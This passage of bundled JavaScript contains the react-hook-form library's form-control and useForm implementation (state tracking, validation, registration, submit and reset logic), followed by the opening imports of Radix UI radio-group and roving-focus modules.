function createFormControl(props = {}) {
  let _options = {
    ...defaultOptions,
    ...props
  };
  let _formState = {
    submitCount: 0,
    isDirty: false,
    isReady: false,
    isLoading: isFunction2(_options.defaultValues),
    isValidating: false,
    isSubmitted: false,
    isSubmitting: false,
    isSubmitSuccessful: false,
    isValid: false,
    touchedFields: {},
    dirtyFields: {},
    validatingFields: {},
    errors: _options.errors || {},
    disabled: _options.disabled || false
  };
  const _fields = {};
  let _defaultValues = isObject(_options.defaultValues) || isObject(_options.values) ? cloneObject(_options.defaultValues || _options.values) || {} : {};
  let _formValues = _options.shouldUnregister ? {} : cloneObject(_defaultValues);
  let _state = {
    action: false,
    mount: false,
    watch: false
  };
  let _names = {
    mount: /* @__PURE__ */ new Set(),
    disabled: /* @__PURE__ */ new Set(),
    unMount: /* @__PURE__ */ new Set(),
    array: /* @__PURE__ */ new Set(),
    watch: /* @__PURE__ */ new Set()
  };
  let delayErrorCallback;
  let timer = 0;
  const _proxyFormState = {
    isDirty: false,
    dirtyFields: false,
    validatingFields: false,
    touchedFields: false,
    isValidating: false,
    isValid: false,
    errors: false
  };
  let _proxySubscribeFormState = {
    ..._proxyFormState
  };
  const _subjects = {
    array: createSubject(),
    state: createSubject()
  };
  const shouldDisplayAllAssociatedErrors = _options.criteriaMode === VALIDATION_MODE.all;
  const debounce = (callback) => (wait) => {
    clearTimeout(timer);
    timer = setTimeout(callback, wait);
  };
  const _setValid = async (shouldUpdateValid) => {
    if (!_options.disabled && (_proxyFormState.isValid || _proxySubscribeFormState.isValid || shouldUpdateValid)) {
      const isValid2 = _options.resolver ? isEmptyObject((await _runSchema()).errors) : await executeBuiltInValidation(_fields, true);
      if (isValid2 !== _formState.isValid) {
        _subjects.state.next({
          isValid: isValid2
        });
      }
    }
  };
  const _updateIsValidating = (names, isValidating) => {
    if (!_options.disabled && (_proxyFormState.isValidating || _proxyFormState.validatingFields || _proxySubscribeFormState.isValidating || _proxySubscribeFormState.validatingFields)) {
      (names || Array.from(_names.mount)).forEach((name) => {
        if (name) {
          isValidating ? set(_formState.validatingFields, name, isValidating) : unset(_formState.validatingFields, name);
        }
      });
      _subjects.state.next({
        validatingFields: _formState.validatingFields,
        isValidating: !isEmptyObject(_formState.validatingFields)
      });
    }
  };
  const _setFieldArray = (name, values = [], method, args, shouldSetValues = true, shouldUpdateFieldsAndState = true) => {
    if (args && method && !_options.disabled) {
      _state.action = true;
      if (shouldUpdateFieldsAndState && Array.isArray(get(_fields, name))) {
        const fieldValues = method(get(_fields, name), args.argA, args.argB);
        shouldSetValues && set(_fields, name, fieldValues);
      }
      if (shouldUpdateFieldsAndState && Array.isArray(get(_formState.errors, name))) {
        const errors = method(get(_formState.errors, name), args.argA, args.argB);
        shouldSetValues && set(_formState.errors, name, errors);
        unsetEmptyArray(_formState.errors, name);
      }
      if ((_proxyFormState.touchedFields || _proxySubscribeFormState.touchedFields) && shouldUpdateFieldsAndState && Array.isArray(get(_formState.touchedFields, name))) {
        const touchedFields = method(get(_formState.touchedFields, name), args.argA, args.argB);
        shouldSetValues && set(_formState.touchedFields, name, touchedFields);
      }
      if (_proxyFormState.dirtyFields || _proxySubscribeFormState.dirtyFields) {
        _formState.dirtyFields = getDirtyFields(_defaultValues, _formValues);
      }
      _subjects.state.next({
        name,
        isDirty: _getDirty(name, values),
        dirtyFields: _formState.dirtyFields,
        errors: _formState.errors,
        isValid: _formState.isValid
      });
    } else {
      set(_formValues, name, values);
    }
  };
  const updateErrors = (name, error) => {
    set(_formState.errors, name, error);
    _subjects.state.next({
      errors: _formState.errors
    });
  };
  const _setErrors = (errors) => {
    _formState.errors = errors;
    _subjects.state.next({
      errors: _formState.errors,
      isValid: false
    });
  };
  const updateValidAndValue = (name, shouldSkipSetValueAs, value, ref) => {
    const field = get(_fields, name);
    if (field) {
      const defaultValue = get(_formValues, name, isUndefined(value) ? get(_defaultValues, name) : value);
      isUndefined(defaultValue) || ref && ref.defaultChecked || shouldSkipSetValueAs ? set(_formValues, name, shouldSkipSetValueAs ? defaultValue : getFieldValue(field._f)) : setFieldValue(name, defaultValue);
      _state.mount && _setValid();
    }
  };
  const updateTouchAndDirty = (name, fieldValue, isBlurEvent, shouldDirty, shouldRender) => {
    let shouldUpdateField = false;
    let isPreviousDirty = false;
    const output = {
      name
    };
    if (!_options.disabled) {
      if (!isBlurEvent || shouldDirty) {
        if (_proxyFormState.isDirty || _proxySubscribeFormState.isDirty) {
          isPreviousDirty = _formState.isDirty;
          _formState.isDirty = output.isDirty = _getDirty();
          shouldUpdateField = isPreviousDirty !== output.isDirty;
        }
        const isCurrentFieldPristine = deepEqual2(get(_defaultValues, name), fieldValue);
        isPreviousDirty = !!get(_formState.dirtyFields, name);
        isCurrentFieldPristine ? unset(_formState.dirtyFields, name) : set(_formState.dirtyFields, name, true);
        output.dirtyFields = _formState.dirtyFields;
        shouldUpdateField = shouldUpdateField || (_proxyFormState.dirtyFields || _proxySubscribeFormState.dirtyFields) && isPreviousDirty !== !isCurrentFieldPristine;
      }
      if (isBlurEvent) {
        const isPreviousFieldTouched = get(_formState.touchedFields, name);
        if (!isPreviousFieldTouched) {
          set(_formState.touchedFields, name, isBlurEvent);
          output.touchedFields = _formState.touchedFields;
          shouldUpdateField = shouldUpdateField || (_proxyFormState.touchedFields || _proxySubscribeFormState.touchedFields) && isPreviousFieldTouched !== isBlurEvent;
        }
      }
      shouldUpdateField && shouldRender && _subjects.state.next(output);
    }
    return shouldUpdateField ? output : {};
  };
  const shouldRenderByError = (name, isValid2, error, fieldState) => {
    const previousFieldError = get(_formState.errors, name);
    const shouldUpdateValid = (_proxyFormState.isValid || _proxySubscribeFormState.isValid) && isBoolean(isValid2) && _formState.isValid !== isValid2;
    if (_options.delayError && error) {
      delayErrorCallback = debounce(() => updateErrors(name, error));
      delayErrorCallback(_options.delayError);
    } else {
      clearTimeout(timer);
      delayErrorCallback = null;
      error ? set(_formState.errors, name, error) : unset(_formState.errors, name);
    }
    if ((error ? !deepEqual2(previousFieldError, error) : previousFieldError) || !isEmptyObject(fieldState) || shouldUpdateValid) {
      const updatedFormState = {
        ...fieldState,
        ...shouldUpdateValid && isBoolean(isValid2) ? { isValid: isValid2 } : {},
        errors: _formState.errors,
        name
      };
      _formState = {
        ..._formState,
        ...updatedFormState
      };
      _subjects.state.next(updatedFormState);
    }
  };
  const _runSchema = async (name) => {
    _updateIsValidating(name, true);
    const result = await _options.resolver(_formValues, _options.context, getResolverOptions(name || _names.mount, _fields, _options.criteriaMode, _options.shouldUseNativeValidation));
    _updateIsValidating(name);
    return result;
  };
  const executeSchemaAndUpdateState = async (names) => {
    const { errors } = await _runSchema(names);
    if (names) {
      for (const name of names) {
        const error = get(errors, name);
        error ? set(_formState.errors, name, error) : unset(_formState.errors, name);
      }
    } else {
      _formState.errors = errors;
    }
    return errors;
  };
  const executeBuiltInValidation = async (fields, shouldOnlyCheckValid, context = {
    valid: true
  }) => {
    for (const name in fields) {
      const field = fields[name];
      if (field) {
        const { _f, ...fieldValue } = field;
        if (_f) {
          const isFieldArrayRoot = _names.array.has(_f.name);
          const isPromiseFunction = field._f && hasPromiseValidation(field._f);
          if (isPromiseFunction && _proxyFormState.validatingFields) {
            _updateIsValidating([name], true);
          }
          const fieldError = await validateField(field, _names.disabled, _formValues, shouldDisplayAllAssociatedErrors, _options.shouldUseNativeValidation && !shouldOnlyCheckValid, isFieldArrayRoot);
          if (isPromiseFunction && _proxyFormState.validatingFields) {
            _updateIsValidating([name]);
          }
          if (fieldError[_f.name]) {
            context.valid = false;
            if (shouldOnlyCheckValid) {
              break;
            }
          }
          !shouldOnlyCheckValid && (get(fieldError, _f.name) ? isFieldArrayRoot ? updateFieldArrayRootError(_formState.errors, fieldError, _f.name) : set(_formState.errors, _f.name, fieldError[_f.name]) : unset(_formState.errors, _f.name));
        }
        !isEmptyObject(fieldValue) && await executeBuiltInValidation(fieldValue, shouldOnlyCheckValid, context);
      }
    }
    return context.valid;
  };
  const _removeUnmounted = () => {
    for (const name of _names.unMount) {
      const field = get(_fields, name);
      field && (field._f.refs ? field._f.refs.every((ref) => !live(ref)) : !live(field._f.ref)) && unregister(name);
    }
    _names.unMount = /* @__PURE__ */ new Set();
  };
  const _getDirty = (name, data) => !_options.disabled && (name && data && set(_formValues, name, data), !deepEqual2(getValues(), _defaultValues));
  const _getWatch = (names, defaultValue, isGlobal) => generateWatchOutput(names, _names, {
    ..._state.mount ? _formValues : isUndefined(defaultValue) ? _defaultValues : isString(names) ? { [names]: defaultValue } : defaultValue
  }, isGlobal, defaultValue);
  const _getFieldArray = (name) => compact(get(_state.mount ? _formValues : _defaultValues, name, _options.shouldUnregister ? get(_defaultValues, name, []) : []));
  const setFieldValue = (name, value, options = {}) => {
    const field = get(_fields, name);
    let fieldValue = value;
    if (field) {
      const fieldReference = field._f;
      if (fieldReference) {
        !fieldReference.disabled && set(_formValues, name, getFieldValueAs(value, fieldReference));
        fieldValue = isHTMLElement3(fieldReference.ref) && isNullOrUndefined(value) ? "" : value;
        if (isMultipleSelect(fieldReference.ref)) {
          [...fieldReference.ref.options].forEach((optionRef) => optionRef.selected = fieldValue.includes(optionRef.value));
        } else if (fieldReference.refs) {
          if (isCheckBoxInput(fieldReference.ref)) {
            fieldReference.refs.forEach((checkboxRef) => {
              if (!checkboxRef.defaultChecked || !checkboxRef.disabled) {
                if (Array.isArray(fieldValue)) {
                  checkboxRef.checked = !!fieldValue.find((data) => data === checkboxRef.value);
                } else {
                  checkboxRef.checked = fieldValue === checkboxRef.value || !!fieldValue;
                }
              }
            });
          } else {
            fieldReference.refs.forEach((radioRef) => radioRef.checked = radioRef.value === fieldValue);
          }
        } else if (isFileInput(fieldReference.ref)) {
          fieldReference.ref.value = "";
        } else {
          fieldReference.ref.value = fieldValue;
          if (!fieldReference.ref.type) {
            _subjects.state.next({
              name,
              values: cloneObject(_formValues)
            });
          }
        }
      }
    }
    (options.shouldDirty || options.shouldTouch) && updateTouchAndDirty(name, fieldValue, options.shouldTouch, options.shouldDirty, true);
    options.shouldValidate && trigger(name);
  };
  const setValues = (name, value, options) => {
    for (const fieldKey in value) {
      if (!value.hasOwnProperty(fieldKey)) {
        return;
      }
      const fieldValue = value[fieldKey];
      const fieldName = name + "." + fieldKey;
      const field = get(_fields, fieldName);
      (_names.array.has(name) || isObject(fieldValue) || field && !field._f) && !isDateObject(fieldValue) ? setValues(fieldName, fieldValue, options) : setFieldValue(fieldName, fieldValue, options);
    }
  };
  const setValue = (name, value, options = {}) => {
    const field = get(_fields, name);
    const isFieldArray = _names.array.has(name);
    const cloneValue = cloneObject(value);
    set(_formValues, name, cloneValue);
    if (isFieldArray) {
      _subjects.array.next({
        name,
        values: cloneObject(_formValues)
      });
      if ((_proxyFormState.isDirty || _proxyFormState.dirtyFields || _proxySubscribeFormState.isDirty || _proxySubscribeFormState.dirtyFields) && options.shouldDirty) {
        _subjects.state.next({
          name,
          dirtyFields: getDirtyFields(_defaultValues, _formValues),
          isDirty: _getDirty(name, cloneValue)
        });
      }
    } else {
      field && !field._f && !isNullOrUndefined(cloneValue) ? setValues(name, cloneValue, options) : setFieldValue(name, cloneValue, options);
    }
    isWatched(name, _names) && _subjects.state.next({ ..._formState });
    _subjects.state.next({
      name: _state.mount ? name : void 0,
      values: cloneObject(_formValues)
    });
  };
  const onChange = async (event) => {
    _state.mount = true;
    const target = event.target;
    let name = target.name;
    let isFieldValueUpdated = true;
    const field = get(_fields, name);
    const _updateIsFieldValueUpdated = (fieldValue) => {
      isFieldValueUpdated = Number.isNaN(fieldValue) || isDateObject(fieldValue) && isNaN(fieldValue.getTime()) || deepEqual2(fieldValue, get(_formValues, name, fieldValue));
    };
    const validationModeBeforeSubmit = getValidationModes(_options.mode);
    const validationModeAfterSubmit = getValidationModes(_options.reValidateMode);
    if (field) {
      let error;
      let isValid2;
      const fieldValue = target.type ? getFieldValue(field._f) : getEventValue(event);
      const isBlurEvent = event.type === EVENTS.BLUR || event.type === EVENTS.FOCUS_OUT;
      const shouldSkipValidation = !hasValidation(field._f) && !_options.resolver && !get(_formState.errors, name) && !field._f.deps || skipValidation(isBlurEvent, get(_formState.touchedFields, name), _formState.isSubmitted, validationModeAfterSubmit, validationModeBeforeSubmit);
      const watched = isWatched(name, _names, isBlurEvent);
      set(_formValues, name, fieldValue);
      if (isBlurEvent) {
        field._f.onBlur && field._f.onBlur(event);
        delayErrorCallback && delayErrorCallback(0);
      } else if (field._f.onChange) {
        field._f.onChange(event);
      }
      const fieldState = updateTouchAndDirty(name, fieldValue, isBlurEvent);
      const shouldRender = !isEmptyObject(fieldState) || watched;
      !isBlurEvent && _subjects.state.next({
        name,
        type: event.type,
        values: cloneObject(_formValues)
      });
      if (shouldSkipValidation) {
        if (_proxyFormState.isValid || _proxySubscribeFormState.isValid) {
          if (_options.mode === "onBlur") {
            if (isBlurEvent) {
              _setValid();
            }
          } else if (!isBlurEvent) {
            _setValid();
          }
        }
        return shouldRender && _subjects.state.next({ name, ...watched ? {} : fieldState });
      }
      !isBlurEvent && watched && _subjects.state.next({ ..._formState });
      if (_options.resolver) {
        const { errors } = await _runSchema([name]);
        _updateIsFieldValueUpdated(fieldValue);
        if (isFieldValueUpdated) {
          const previousErrorLookupResult = schemaErrorLookup(_formState.errors, _fields, name);
          const errorLookupResult = schemaErrorLookup(errors, _fields, previousErrorLookupResult.name || name);
          error = errorLookupResult.error;
          name = errorLookupResult.name;
          isValid2 = isEmptyObject(errors);
        }
      } else {
        _updateIsValidating([name], true);
        error = (await validateField(field, _names.disabled, _formValues, shouldDisplayAllAssociatedErrors, _options.shouldUseNativeValidation))[name];
        _updateIsValidating([name]);
        _updateIsFieldValueUpdated(fieldValue);
        if (isFieldValueUpdated) {
          if (error) {
            isValid2 = false;
          } else if (_proxyFormState.isValid || _proxySubscribeFormState.isValid) {
            isValid2 = await executeBuiltInValidation(_fields, true);
          }
        }
      }
      if (isFieldValueUpdated) {
        field._f.deps && trigger(field._f.deps);
        shouldRenderByError(name, isValid2, error, fieldState);
      }
    }
  };
  const _focusInput = (ref, key) => {
    if (get(_formState.errors, key) && ref.focus) {
      ref.focus();
      return 1;
    }
    return;
  };
  const trigger = async (name, options = {}) => {
    let isValid2;
    let validationResult;
    const fieldNames = convertToArrayPayload(name);
    if (_options.resolver) {
      const errors = await executeSchemaAndUpdateState(isUndefined(name) ? name : fieldNames);
      isValid2 = isEmptyObject(errors);
      validationResult = name ? !fieldNames.some((name2) => get(errors, name2)) : isValid2;
    } else if (name) {
      validationResult = (await Promise.all(fieldNames.map(async (fieldName) => {
        const field = get(_fields, fieldName);
        return await executeBuiltInValidation(field && field._f ? { [fieldName]: field } : field);
      }))).every(Boolean);
      !(!validationResult && !_formState.isValid) && _setValid();
    } else {
      validationResult = isValid2 = await executeBuiltInValidation(_fields);
    }
    _subjects.state.next({
      ...!isString(name) || (_proxyFormState.isValid || _proxySubscribeFormState.isValid) && isValid2 !== _formState.isValid ? {} : { name },
      ..._options.resolver || !name ? { isValid: isValid2 } : {},
      errors: _formState.errors
    });
    options.shouldFocus && !validationResult && iterateFieldsByAction(_fields, _focusInput, name ? fieldNames : _names.mount);
    return validationResult;
  };
  const getValues = (fieldNames) => {
    const values = {
      ..._state.mount ? _formValues : _defaultValues
    };
    return isUndefined(fieldNames) ? values : isString(fieldNames) ? get(values, fieldNames) : fieldNames.map((name) => get(values, name));
  };
  const getFieldState = (name, formState) => ({
    invalid: !!get((formState || _formState).errors, name),
    isDirty: !!get((formState || _formState).dirtyFields, name),
    error: get((formState || _formState).errors, name),
    isValidating: !!get(_formState.validatingFields, name),
    isTouched: !!get((formState || _formState).touchedFields, name)
  });
  const clearErrors = (name) => {
    name && convertToArrayPayload(name).forEach((inputName) => unset(_formState.errors, inputName));
    _subjects.state.next({
      errors: name ? _formState.errors : {}
    });
  };
  const setError = (name, error, options) => {
    const ref = (get(_fields, name, { _f: {} })._f || {}).ref;
    const currentError = get(_formState.errors, name) || {};
    const { ref: currentRef, message: message2, type, ...restOfErrorTree } = currentError;
    set(_formState.errors, name, {
      ...restOfErrorTree,
      ...error,
      ref
    });
    _subjects.state.next({
      name,
      errors: _formState.errors,
      isValid: false
    });
    options && options.shouldFocus && ref && ref.focus && ref.focus();
  };
  const watch = (name, defaultValue) => isFunction2(name) ? _subjects.state.subscribe({
    next: (payload) => name(_getWatch(void 0, defaultValue), payload)
  }) : _getWatch(name, defaultValue, true);
  const _subscribe = (props2) => _subjects.state.subscribe({
    next: (formState) => {
      if (shouldSubscribeByName(props2.name, formState.name, props2.exact) && shouldRenderFormState(formState, props2.formState || _proxyFormState, _setFormState, props2.reRenderRoot)) {
        props2.callback({
          values: { ..._formValues },
          ..._formState,
          ...formState
        });
      }
    }
  }).unsubscribe;
  const subscribe = (props2) => {
    _state.mount = true;
    _proxySubscribeFormState = {
      ..._proxySubscribeFormState,
      ...props2.formState
    };
    return _subscribe({
      ...props2,
      formState: _proxySubscribeFormState
    });
  };
  const unregister = (name, options = {}) => {
    for (const fieldName of name ? convertToArrayPayload(name) : _names.mount) {
      _names.mount.delete(fieldName);
      _names.array.delete(fieldName);
      if (!options.keepValue) {
        unset(_fields, fieldName);
        unset(_formValues, fieldName);
      }
      !options.keepError && unset(_formState.errors, fieldName);
      !options.keepDirty && unset(_formState.dirtyFields, fieldName);
      !options.keepTouched && unset(_formState.touchedFields, fieldName);
      !options.keepIsValidating && unset(_formState.validatingFields, fieldName);
      !_options.shouldUnregister && !options.keepDefaultValue && unset(_defaultValues, fieldName);
    }
    _subjects.state.next({
      values: cloneObject(_formValues)
    });
    _subjects.state.next({
      ..._formState,
      ...!options.keepDirty ? {} : { isDirty: _getDirty() }
    });
    !options.keepIsValid && _setValid();
  };
  const _setDisabledField = ({ disabled, name }) => {
    if (isBoolean(disabled) && _state.mount || !!disabled || _names.disabled.has(name)) {
      disabled ? _names.disabled.add(name) : _names.disabled.delete(name);
    }
  };
  const register = (name, options = {}) => {
    let field = get(_fields, name);
    const disabledIsDefined = isBoolean(options.disabled) || isBoolean(_options.disabled);
    set(_fields, name, {
      ...field || {},
      _f: {
        ...field && field._f ? field._f : { ref: { name } },
        name,
        mount: true,
        ...options
      }
    });
    _names.mount.add(name);
    if (field) {
      _setDisabledField({
        disabled: isBoolean(options.disabled) ? options.disabled : _options.disabled,
        name
      });
    } else {
      updateValidAndValue(name, true, options.value);
    }
    return {
      ...disabledIsDefined ? { disabled: options.disabled || _options.disabled } : {},
      ..._options.progressive ? {
        required: !!options.required,
        min: getRuleValue(options.min),
        max: getRuleValue(options.max),
        minLength: getRuleValue(options.minLength),
        maxLength: getRuleValue(options.maxLength),
        pattern: getRuleValue(options.pattern)
      } : {},
      name,
      onChange,
      onBlur: onChange,
      ref: (ref) => {
        if (ref) {
          register(name, options);
          field = get(_fields, name);
          const fieldRef = isUndefined(ref.value) ? ref.querySelectorAll ? ref.querySelectorAll("input,select,textarea")[0] || ref : ref : ref;
          const radioOrCheckbox = isRadioOrCheckbox(fieldRef);
          const refs = field._f.refs || [];
          if (radioOrCheckbox ? refs.find((option) => option === fieldRef) : fieldRef === field._f.ref) {
            return;
          }
          set(_fields, name, {
            _f: {
              ...field._f,
              ...radioOrCheckbox ? {
                refs: [
                  ...refs.filter(live),
                  fieldRef,
                  ...Array.isArray(get(_defaultValues, name)) ? [{}] : []
                ],
                ref: { type: fieldRef.type, name }
              } : { ref: fieldRef }
            }
          });
          updateValidAndValue(name, false, void 0, fieldRef);
        } else {
          field = get(_fields, name, {});
          if (field._f) {
            field._f.mount = false;
          }
          (_options.shouldUnregister || options.shouldUnregister) && !(isNameInFieldArray(_names.array, name) && _state.action) && _names.unMount.add(name);
        }
      }
    };
  };
  const _focusError = () => _options.shouldFocusError && iterateFieldsByAction(_fields, _focusInput, _names.mount);
  const _disableForm = (disabled) => {
    if (isBoolean(disabled)) {
      _subjects.state.next({ disabled });
      iterateFieldsByAction(_fields, (ref, name) => {
        const currentField = get(_fields, name);
        if (currentField) {
          ref.disabled = currentField._f.disabled || disabled;
          if (Array.isArray(currentField._f.refs)) {
            currentField._f.refs.forEach((inputRef) => {
              inputRef.disabled = currentField._f.disabled || disabled;
            });
          }
        }
      }, 0, false);
    }
  };
  const handleSubmit = (onValid, onInvalid) => async (e) => {
    let onValidError = void 0;
    if (e) {
      e.preventDefault && e.preventDefault();
      e.persist && e.persist();
    }
    let fieldValues = cloneObject(_formValues);
    _subjects.state.next({
      isSubmitting: true
    });
    if (_options.resolver) {
      const { errors, values } = await _runSchema();
      _formState.errors = errors;
      fieldValues = cloneObject(values);
    } else {
      await executeBuiltInValidation(_fields);
    }
    if (_names.disabled.size) {
      for (const name of _names.disabled) {
        unset(fieldValues, name);
      }
    }
    unset(_formState.errors, "root");
    if (isEmptyObject(_formState.errors)) {
      _subjects.state.next({
        errors: {}
      });
      try {
        await onValid(fieldValues, e);
      } catch (error) {
        onValidError = error;
      }
    } else {
      if (onInvalid) {
        await onInvalid({ ..._formState.errors }, e);
      }
      _focusError();
      setTimeout(_focusError);
    }
    _subjects.state.next({
      isSubmitted: true,
      isSubmitting: false,
      isSubmitSuccessful: isEmptyObject(_formState.errors) && !onValidError,
      submitCount: _formState.submitCount + 1,
      errors: _formState.errors
    });
    if (onValidError) {
      throw onValidError;
    }
  };
  const resetField = (name, options = {}) => {
    if (get(_fields, name)) {
      if (isUndefined(options.defaultValue)) {
        setValue(name, cloneObject(get(_defaultValues, name)));
      } else {
        setValue(name, options.defaultValue);
        set(_defaultValues, name, cloneObject(options.defaultValue));
      }
      if (!options.keepTouched) {
        unset(_formState.touchedFields, name);
      }
      if (!options.keepDirty) {
        unset(_formState.dirtyFields, name);
        _formState.isDirty = options.defaultValue ? _getDirty(name, cloneObject(get(_defaultValues, name))) : _getDirty();
      }
      if (!options.keepError) {
        unset(_formState.errors, name);
        _proxyFormState.isValid && _setValid();
      }
      _subjects.state.next({ ..._formState });
    }
  };
  const _reset = (formValues, keepStateOptions = {}) => {
    const updatedValues = formValues ? cloneObject(formValues) : _defaultValues;
    const cloneUpdatedValues = cloneObject(updatedValues);
    const isEmptyResetValues = isEmptyObject(formValues);
    const values = isEmptyResetValues ? _defaultValues : cloneUpdatedValues;
    if (!keepStateOptions.keepDefaultValues) {
      _defaultValues = updatedValues;
    }
    if (!keepStateOptions.keepValues) {
      if (keepStateOptions.keepDirtyValues) {
        const fieldsToCheck = /* @__PURE__ */ new Set([
          ..._names.mount,
          ...Object.keys(getDirtyFields(_defaultValues, _formValues))
        ]);
        for (const fieldName of Array.from(fieldsToCheck)) {
          get(_formState.dirtyFields, fieldName) ? set(values, fieldName, get(_formValues, fieldName)) : setValue(fieldName, get(values, fieldName));
        }
      } else {
        if (isWeb && isUndefined(formValues)) {
          for (const name of _names.mount) {
            const field = get(_fields, name);
            if (field && field._f) {
              const fieldReference = Array.isArray(field._f.refs) ? field._f.refs[0] : field._f.ref;
              if (isHTMLElement3(fieldReference)) {
                const form = fieldReference.closest("form");
                if (form) {
                  form.reset();
                  break;
                }
              }
            }
          }
        }
        for (const fieldName of _names.mount) {
          const value = get(values, fieldName, get(_defaultValues, fieldName));
          if (!isUndefined(value)) {
            set(values, fieldName, value);
            setValue(fieldName, get(values, fieldName));
          }
        }
      }
      _formValues = cloneObject(values);
      _subjects.array.next({
        values: { ...values }
      });
      _subjects.state.next({
        values: { ...values }
      });
    }
    _names = {
      mount: keepStateOptions.keepDirtyValues ? _names.mount : /* @__PURE__ */ new Set(),
      unMount: /* @__PURE__ */ new Set(),
      array: /* @__PURE__ */ new Set(),
      disabled: /* @__PURE__ */ new Set(),
      watch: /* @__PURE__ */ new Set(),
      watchAll: false,
      focus: ""
    };
    _state.mount = !_proxyFormState.isValid || !!keepStateOptions.keepIsValid || !!keepStateOptions.keepDirtyValues;
    _state.watch = !!_options.shouldUnregister;
    _subjects.state.next({
      submitCount: keepStateOptions.keepSubmitCount ? _formState.submitCount : 0,
      isDirty: isEmptyResetValues ? false : keepStateOptions.keepDirty ? _formState.isDirty : !!(keepStateOptions.keepDefaultValues && !deepEqual2(formValues, _defaultValues)),
      isSubmitted: keepStateOptions.keepIsSubmitted ? _formState.isSubmitted : false,
      dirtyFields: isEmptyResetValues ? {} : keepStateOptions.keepDirtyValues ? keepStateOptions.keepDefaultValues && _formValues ? getDirtyFields(_defaultValues, _formValues) : _formState.dirtyFields : keepStateOptions.keepDefaultValues && formValues ? getDirtyFields(_defaultValues, formValues) : keepStateOptions.keepDirty ? _formState.dirtyFields : {},
      touchedFields: keepStateOptions.keepTouched ? _formState.touchedFields : {},
      errors: keepStateOptions.keepErrors ? _formState.errors : {},
      isSubmitSuccessful: keepStateOptions.keepIsSubmitSuccessful ? _formState.isSubmitSuccessful : false,
      isSubmitting: false
    });
  };
  const reset = (formValues, keepStateOptions) => _reset(isFunction2(formValues) ? formValues(_formValues) : formValues, keepStateOptions);
  const setFocus = (name, options = {}) => {
    const field = get(_fields, name);
    const fieldReference = field && field._f;
    if (fieldReference) {
      const fieldRef = fieldReference.refs ? fieldReference.refs[0] : fieldReference.ref;
      if (fieldRef.focus) {
        fieldRef.focus();
        options.shouldSelect && isFunction2(fieldRef.select) && fieldRef.select();
      }
    }
  };
  const _setFormState = (updatedFormState) => {
    _formState = {
      ..._formState,
      ...updatedFormState
    };
  };
  const _resetDefaultValues = () => isFunction2(_options.defaultValues) && _options.defaultValues().then((values) => {
    reset(values, _options.resetOptions);
    _subjects.state.next({
      isLoading: false
    });
  });
  const methods = {
    control: {
      register,
      unregister,
      getFieldState,
      handleSubmit,
      setError,
      _subscribe,
      _runSchema,
      _focusError,
      _getWatch,
      _getDirty,
      _setValid,
      _setFieldArray,
      _setDisabledField,
      _setErrors,
      _getFieldArray,
      _reset,
      _resetDefaultValues,
      _removeUnmounted,
      _disableForm,
      _subjects,
      _proxyFormState,
      get _fields() {
        return _fields;
      },
      get _formValues() {
        return _formValues;
      },
      get _state() {
        return _state;
      },
      set _state(value) {
        _state = value;
      },
      get _defaultValues() {
        return _defaultValues;
      },
      get _names() {
        return _names;
      },
      set _names(value) {
        _names = value;
      },
      get _formState() {
        return _formState;
      },
      get _options() {
        return _options;
      },
      set _options(value) {
        _options = {
          ..._options,
          ...value
        };
      }
    },
    subscribe,
    trigger,
    register,
    handleSubmit,
    watch,
    setValue,
    getValues,
    reset,
    resetField,
    clearErrors,
    unregister,
    setError,
    setFocus,
    getFieldState
  };
  return {
    ...methods,
    formControl: methods
  };
}
function useForm(props = {}) {
  const _formControl = React__default.useRef(void 0);
  const _values = React__default.useRef(void 0);
  const [formState, updateFormState] = React__default.useState({
    isDirty: false,
    isValidating: false,
    isLoading: isFunction2(props.defaultValues),
    isSubmitted: false,
    isSubmitting: false,
    isSubmitSuccessful: false,
    isValid: false,
    submitCount: 0,
    dirtyFields: {},
    touchedFields: {},
    validatingFields: {},
    errors: props.errors || {},
    disabled: props.disabled || false,
    isReady: false,
    defaultValues: isFunction2(props.defaultValues) ? void 0 : props.defaultValues
  });
  if (!_formControl.current) {
    if (props.formControl) {
      _formControl.current = {
        ...props.formControl,
        formState
      };
      if (props.defaultValues && !isFunction2(props.defaultValues)) {
        props.formControl.reset(props.defaultValues, props.resetOptions);
      }
    } else {
      const { formControl, ...rest } = createFormControl(props);
      _formControl.current = {
        ...rest,
        formState
      };
    }
  }
  const control = _formControl.current.control;
  control._options = props;
  useIsomorphicLayoutEffect3(() => {
    const sub = control._subscribe({
      formState: control._proxyFormState,
      callback: () => updateFormState({ ...control._formState }),
      reRenderRoot: true
    });
    updateFormState((data) => ({
      ...data,
      isReady: true
    }));
    control._formState.isReady = true;
    return sub;
  }, [control]);
  React__default.useEffect(() => control._disableForm(props.disabled), [control, props.disabled]);
  React__default.useEffect(() => {
    if (props.mode) {
      control._options.mode = props.mode;
    }
    if (props.reValidateMode) {
      control._options.reValidateMode = props.reValidateMode;
    }
  }, [control, props.mode, props.reValidateMode]);
  React__default.useEffect(() => {
    if (props.errors) {
      control._setErrors(props.errors);
      control._focusError();
    }
  }, [control, props.errors]);
  React__default.useEffect(() => {
    props.shouldUnregister && control._subjects.state.next({
      values: control._getWatch()
    });
  }, [control, props.shouldUnregister]);
  React__default.useEffect(() => {
    if (control._proxyFormState.isDirty) {
      const isDirty = control._getDirty();
      if (isDirty !== formState.isDirty) {
        control._subjects.state.next({
          isDirty
        });
      }
    }
  }, [control, formState.isDirty]);
  React__default.useEffect(() => {
    if (props.values && !deepEqual2(props.values, _values.current)) {
      control._reset(props.values, control._options.resetOptions);
      _values.current = props.values;
      updateFormState((state) => ({ ...state }));
    } else {
      control._resetDefaultValues();
    }
  }, [control, props.values]);
  React__default.useEffect(() => {
    if (!control._state.mount) {
      control._setValid();
      control._state.mount = true;
    }
    if (control._state.watch) {
      control._state.watch = false;
      control._subjects.state.next({ ...control._formState });
    }
    control._removeUnmounted();
  });
  _formControl.current.formState = getProxyFormState(formState, control);
  return _formControl.current;
}

// client/src/components/ui/radio-group.tsx
import * as React63 from "react";

// node_modules/@radix-ui/react-radio-group/dist/index.mjs
import * as React210 from "react";

// node_modules/@radix-ui/react-roving-focus/dist/index.mjs
import * as React61 from "react";
import { jsx as jsx51 } from "react/jsx-runtime";
var ENTRY_FOCUS = "rovingFocusGroup.onEntryFocus";
var EVENT_OPTIONS2 = { bubbles: false, cancelable: true };
var GROUP_NAME2 = "RovingFocusGroup";
var [Collection3, useCollection3, createCollectionScope3] = createCollection(GROUP_NAME2);
var [createRovingFocusGroupContext, createRovingFocusGroupScope] = createContextScope(
  GROUP_NAME2,
  [createCollectionScope3]
);
